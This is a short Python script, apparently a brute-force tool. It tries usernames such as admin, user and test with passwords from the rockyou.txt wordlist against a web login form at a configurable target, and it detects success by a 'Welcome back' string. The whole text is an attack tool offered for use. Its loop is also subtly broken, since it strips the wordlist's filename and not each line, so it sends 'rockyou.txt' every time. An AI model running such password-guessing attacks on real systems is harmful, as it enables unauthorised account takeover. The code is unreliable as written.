import requests
import sys

#replace ip address and port number
target = "http://127.0.0.1:80"

usernames = ["admin","user","test"]


passwords = "rockyou.txt"

needle = "Welcome back"
for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = passwords.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username , password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username": username , "password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for '{}'!".format(username))
		sys.stdout.write("\n")
